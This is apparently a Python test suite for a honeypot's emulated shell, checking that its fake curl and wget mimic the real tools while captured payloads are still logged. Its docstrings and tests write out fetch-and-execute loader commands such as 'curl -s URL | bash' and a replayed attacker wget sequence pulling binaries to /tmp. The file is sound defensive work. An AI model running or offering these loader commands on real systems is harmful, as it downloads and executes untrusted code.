#!/usr/bin/env python3
"""Do curl and wget behave the way a loader expects?

Every staged payload arrives through one of these two, so what they do --
and just as importantly what they leave behind -- is load-bearing.

  - A bare `curl URL` saved the body under the URL's basename. Real curl
    writes to stdout and creates nothing; only -o and -O save. So
    `curl -s http://host/y.sh | bash`, the commonest loader idiom there
    is, left /root/y.sh sitting on disk that a real box would not have,
    and an actor who runs `ls` after piping sees a file they never asked
    for.
  - `curl -I` returned the body. -I is a HEAD: headers, no body. A loader
    uses it to check a stage is alive and how big it is before pulling it,
    so it got the payload where it expected a Content-Length.
  - `curl -w` printed nothing, so
    `code=$(curl -s -o /dev/null -w "%{http_code}" $url)` compared empty
    against 200 and every liveness test failed.

The capture is separate from all of this and must survive it: what we keep
out-of-band is not what the attacker's shell is supposed to show them.

Run from `honeypot/`, or on the guest.
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fakeshell as fs                                        # noqa: E402

PASS, FAIL = [], []
URL = "http://192.0.2.1/pl.sh"          # TEST-NET-1, never routable


def sh(capture=None):
    events = []
    dl = None
    if capture is not None:
        dl = lambda url: capture                              # noqa: E731
    s = fs.Shell(fs.VFS(), log=lambda **k: events.append(k),
                 download=dl, peer="203.0.113.77")
    s.exec_mode = True
    s.events = events
    return s


def run(s, cmd):
    out = s.run(cmd)
    err = "".join(s._err)
    s._err.clear()
    return (out + err), s.last_rc


def check(name, cond, detail=""):
    (PASS if cond else FAIL).append(name)
    if not cond:
        print("  FAIL %-52s %s" % (name, detail))


def eq(name, got, want):
    check(name, got == want, "want %r got %r" % (want, got))


def t_a_bare_curl_leaves_nothing_behind():
    s = sh()
    run(s, "curl -s %s > /dev/null" % URL)
    check("no file under the basename", not s.fs.exists("/root/pl.sh"), "")
    check("and none in the cwd either", not s.fs.exists("./pl.sh"), "")


def t_dash_o_and_dash_O_do_save():
    s = sh()
    run(s, "curl -sO %s" % URL)
    check("-O saves under the remote name", s.fs.exists("/root/pl.sh"), "")
    s = sh()
    run(s, "curl -s -o /tmp/keep.bin %s" % URL)
    check("-o saves under the given name", s.fs.exists("/tmp/keep.bin"), "")
    check("and not under the remote one", not s.fs.exists("/root/pl.sh"), "")


def t_the_pipe_idiom_still_works():
    """`curl -s URL | sh` has to run the fetched script, which is the whole
    reason the body is kept in memory."""
    s = sh(capture={"sha256": "ab" * 32, "size": 22,
                    "content": b"#!/bin/sh\necho staged\n"})
    out, _rc = run(s, "curl -s %s | sh" % URL)
    check("the staged script ran", "staged" in out, out[:40])
    check("and still left no file", not s.fs.exists("/root/pl.sh"), "")


def t_the_capture_survives_not_saving():
    """The out-of-band capture is what this box is for. Not writing the
    bytes into the emulated filesystem must not touch it."""
    s = sh(capture={"sha256": "cd" * 32, "size": 1234,
                    "content": b"#!/bin/sh\nid\n"})
    run(s, "curl -s %s > /dev/null" % URL)
    dl = [e for e in s.events if e.get("event") == "download"]
    eq("one download event", len(dl), 1)
    eq("marked captured", dl[0].get("captured"), True)
    eq("with the hash", dl[0].get("sha256"), "cd" * 32)
    eq("and the size", dl[0].get("size"), 1234)


def t_head_returns_headers_not_a_body():
    s = sh()
    out, rc = run(s, "curl -sI %s" % URL)
    eq("rc", rc, 0)
    lines = out.replace("\r", "").strip().splitlines()
    eq("status line", lines[0], "HTTP/1.1 200 OK")
    keys = [l.split(":")[0] for l in lines[1:] if ":" in l]
    for k in ("Server", "Date", "Content-Type", "Content-Length",
              "Connection", "Accept-Ranges"):
        check("names %s" % k, k in keys, str(keys))
    check("no ELF body", "\x7fELF" not in out, repr(out[:30]))
    check("-I saves nothing", not s.fs.exists("/root/pl.sh"), "")
    # Content-Length has to be a number a caller can act on.
    cl = [l for l in lines if l.startswith("Content-Length:")][0]
    check("Content-Length is numeric", cl.split(":")[1].strip().isdigit(),
          cl)


def t_head_content_type_follows_the_name():
    s = sh()
    out, _rc = run(s, "curl -sI http://192.0.2.1/x.sh")
    check(".sh is text/plain", "Content-Type: text/plain" in out, out[:80])
    s = sh()
    out, _rc = run(s, "curl -sI http://192.0.2.1/x.bin")
    check(".bin is octet-stream",
          "Content-Type: application/octet-stream" in out, out[:80])


def t_write_out_expands_its_tokens():
    """The liveness check every staged loader runs."""
    s = sh()
    out, _rc = run(s, 'curl -s -o /dev/null -w "%%{http_code}" %s' % URL)
    eq("http_code", out.strip(), "200")
    s = sh(capture={"sha256": "ef" * 32, "size": 4096, "content": b"x"})
    out, _rc = run(s, 'curl -s -o /dev/null -w "%%{http_code} %%{size_download}" %s'
                   % URL)
    eq("code and size", out.strip(), "200 4096")
    s = sh()
    out, _rc = run(s, 'curl -s -o /dev/null -w "%%{url_effective}" %s' % URL)
    eq("url_effective", out.strip(), URL)
    s = sh()
    out, _rc = run(s, 'curl -s -o /dev/null -w "code=%%{http_code}\\n" %s'
                   % URL)
    eq("literal text and a newline escape", out, "code=200\n")


def t_write_out_is_silent_without_the_flag():
    s = sh()
    out, _rc = run(s, "curl -s -o /dev/null %s" % URL)
    eq("nothing extra on stdout", out, "")


def t_wget_still_saves_by_default():
    """wget is the opposite of curl here and must stay that way."""
    s = sh()
    run(s, "cd /tmp && wget -q %s" % URL)
    check("wget saves without being asked", s.fs.exists("/tmp/pl.sh"), "")
    s = sh()
    run(s, "wget -q -O /tmp/named.bin %s" % URL)
    check("-O names it", s.fs.exists("/tmp/named.bin"), "")
    s = sh()
    run(s, "wget -q -P /tmp %s" % URL)
    check("-P places it", s.fs.exists("/tmp/pl.sh"), "")


def t_a_fabricated_body_is_not_a_captured_payload():
    """When the fetch fails we invent a body so the attacker's own `ls`
    shows the file their command claimed to create. Writing it is right;
    filing it in the payload store is not -- the store is for bytes
    somebody actually sent us, and a fabricated ELF recorded against their
    address is invented intelligence. Three had already accumulated when
    this was found, all from a failed fetch to a dead host.
    """
    s = sh()                        # no download callback: the fetch fails
    run(s, "curl -sO %s" % URL)
    check("the file the command promised is there",
          s.fs.exists("/root/pl.sh"), "")
    pw = [e for e in s.events if e.get("event") == "payload_written"]
    eq("but nothing was captured", pw, [])


def t_a_real_body_is_still_captured():
    """The other direction: a fetch that genuinely returns bytes must still
    be recorded, or the fix above would have thrown the baby out."""
    s = sh(capture={"sha256": "ab" * 32, "size": 15,
                    "content": b"#!/bin/sh\nreal\n"})
    run(s, "curl -sO %s" % URL)
    check("the file is there", s.fs.exists("/root/pl.sh"), "")
    dl = [e for e in s.events
          if e.get("event") == "download" and e.get("captured")]
    eq("and the download was captured", len(dl), 1)
    eq("with its hash", dl[0].get("sha256"), "ab" * 32)


# -- wget's resolve/connect preamble ------------------------------------
# Found from live traffic on 2026-08-22: a loader at 203.0.113.25 fetched
# four payloads from http://203.0.113.21:8080/b/ and our wget answered
#   Resolving 203.0.113.21 (203.0.113.21)... 198.51.100.x
#   Connecting to 203.0.113.21 (203.0.113.21)|198.51.100.x|:80... connected.
# directly beneath a URL that says :8080. Real wget, measured on the
# guest, does no lookup for an IP literal and prints no Resolving line:
#   --2026-08-22 07:09:13--  http://127.0.0.1:9/x
#   Connecting to 127.0.0.1:9... failed: Connection refused.
# and for a hostname prints
#   Resolving localhost (localhost)... ::1, 127.0.0.1
#   Connecting to localhost (localhost)|::1|:9... failed: Connection refused.

def t_wget_does_not_resolve_an_ip_literal():
    s = sh(capture={"sha256": "11" * 32, "size": 2048,
                    "content": b"payload"})
    out, _ = run(s, "wget -t 1 http://203.0.113.21:8080/b/amd64")
    check("no Resolving line for a literal", "Resolving" not in out, out[:200])
    check("connects to the literal on its own port",
          "Connecting to 203.0.113.21:8080... connected." in out, out[:200])


def t_wget_honours_the_url_port():
    s = sh(capture={"sha256": "11" * 32, "size": 2048,
                    "content": b"payload"})
    out, _ = run(s, "wget http://198.51.100.7/x")
    check("default http port is 80", "198.51.100.7:80..." in out, out[:160])
    out, _ = run(s, "wget https://198.51.100.7/x")
    check("default https port is 443", "198.51.100.7:443..." in out, out[:160])
    out, _ = run(s, "wget http://198.51.100.7:8443/x")
    check("an explicit port is used", "198.51.100.7:8443..." in out, out[:160])
    check("and 80 is not also claimed", ":80..." not in out, out[:160])


def t_wget_resolves_a_hostname():
    s = sh(capture={"sha256": "11" * 32, "size": 2048,
                    "content": b"payload"})
    out, _ = run(s, "wget http://example.org/x")
    check("a hostname does get a Resolving line",
          "Resolving example.org (example.org)... " in out, out[:200])
    check("and the connect line carries the address in bars",
          "|:80... connected." in out and "Connecting to example.org "
          "(example.org)|" in out, out[:220])


def t_a_hostname_resolves_the_same_way_twice():
    """It was random per call: one host, two addresses in one session."""
    s = sh(capture={"sha256": "11" * 32, "size": 2048,
                    "content": b"payload"})
    first = [l for l in run(s, "wget http://example.org/a")[0].split("\n")
             if "Resolving" in l]
    second = [l for l in run(s, "wget http://example.org/b")[0].split("\n")
              if "Resolving" in l]
    eq("the same host resolves to the same address", first, second)
    other = [l for l in run(s, "wget http://other.example/c")[0].split("\n")
             if "Resolving" in l]
    check("a different host gets a different one", other != first,
          "%r vs %r" % (other, first))


def t_the_live_loader_sequence_reads_cleanly():
    """The exact four fetches 203.0.113.25 ran."""
    s = sh(capture={"sha256": "22" * 32, "size": 5242880,
                    "content": b"\x7fELF"})
    for name in ("amd64", "kal64", "kswpad", "linux"):
        out, rc = run(s, "cd /tmp;rm -f %s;"
                         "wget -t 1 http://203.0.113.21:8080/b/%s"
                      % (name, name))
        eq("fetching %s exits 0" % name, rc, 0)
        check("%s: no invented resolution" % name,
              "Resolving" not in out, out[:160])
        check("%s: port preserved" % name, ":8080" in out, out[:160])
        check("%s: saved" % name, "saved" in out, out[-160:])


TESTS = [v for k, v in sorted(globals().items()) if k.startswith("t_")]


def main():
    for t in TESTS:
        try:
            t()
        except Exception as exc:                              # noqa: BLE001
            check(t.__name__, False, "crashed: %r" % (exc,))
    print("passed %d, failed %d" % (len(PASS), len(FAIL)))
    if FAIL:
        print("failed: " + ", ".join(FAIL[:6]))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
